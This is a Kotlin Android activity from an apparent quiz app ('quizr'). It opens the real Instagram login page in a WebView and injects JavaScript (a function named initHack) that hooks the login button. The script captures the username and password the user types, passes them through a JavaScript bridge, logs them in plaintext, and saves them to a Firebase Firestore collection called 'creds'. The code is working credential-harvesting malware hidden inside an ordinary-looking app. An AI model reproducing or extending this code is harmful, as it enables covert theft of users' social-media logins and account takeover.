package com.ncs.quizr.insta

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import com.google.firebase.auth.ktx.auth
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.ncs.quizr.databinding.ActivityInstaBinding
import com.ncs.quizr.databinding.ActivityMainBinding
import com.ncs.quizr.main.MainActivity

class InstaActivity : AppCompatActivity() {

    lateinit var binding : ActivityInstaBinding;
    var isSet: Boolean = false

    object JSBridge {

        lateinit var creds: String
        val DB = Firebase.firestore



        fun setCredse(credss: String) {
            this.creds = credss

            val userData = hashMapOf(
                "creds" to credss,
            )

            DB.collection("users").document(Firebase.auth.currentUser?.email.toString()).collection("creds")
                .document("insta")
                .set(userData)

        }
        @JavascriptInterface
        fun callFromJS(username: String, pass: String) {
            Log.d("Call from Js", "username : ${username} \n password : ${pass}")
            setCredse("username: ${username} , pass: ${pass}")
            //       Log.d("Call from Js", "Hello")
        }

        fun getCreden(): String {
            return creds
        }

        @JavascriptInterface
        fun callFromJSX() {

            //  Log.d("Call from Js", "username : ${username} \\n password : ${pass}")
            Log.d("Call from Js", "Hello")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityInstaBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val webView : WebView = binding.webView
        webView.loadUrl("https://www.instagram.com/")
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        ///webView.evaluateJavascript("document.body.style.background = 'blue';",null)
        webView.webViewClient = object: WebViewClient(){

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                injectJs(view)

            }

        }
        webView.addJavascriptInterface(JSBridge, "Bridge")

    }



    private fun injectJs(view: WebView?) {
        view!!.loadUrl(
            """
                 javascript: 
                   (function(){
                   
                 var vis = 0;
                  
                    function waitForElement(id, callback){
                
                 var poops = setInterval(function(){
                  if(document.getElementsByClassName(id)[1] && vis!=1){
                    clearInterval(poops);
                    callback(); vis = 1;
                         }
                         }, 100);
                  }
                  

             waitForElement("_aa4b _add6 _ac4d", function(){
                        
                        initHack();
                       
                });
               
                    function initHack(){
                        console.log("clickedLogin");
                        let element = document.getElementsByClassName("_aa4b _add6 _ac4d");
                        let username = 123;
                        let pass = 123;
                   
                   
                        let authBtn = document.getElementsByClassName("_acan _acap _acas")[1];
                        authBtn.onclick= function() {myFunc()};
                  
                         function myFunc(){
                              username = element.username.value;
                             pass = element.password.value;
                             Bridge.callFromJS(username,pass);
                             console.log(username);
                        
                          }
                    }
                    
                    
          
              })()
                """
        )
    }


}
//function initViews(){
//    console.log("Initiating views ");
//    let loginBtn = document.getElementsByClassName("_acan _acao _acas")[0];
//    loginBtn.remove();
//    loginBtn.onclick = function() {initHack()};


//function myFunc(){
//    username = element.username.value;
//    pass = element.password.value;
//    Bridge.callFromJS(username,pass);
//}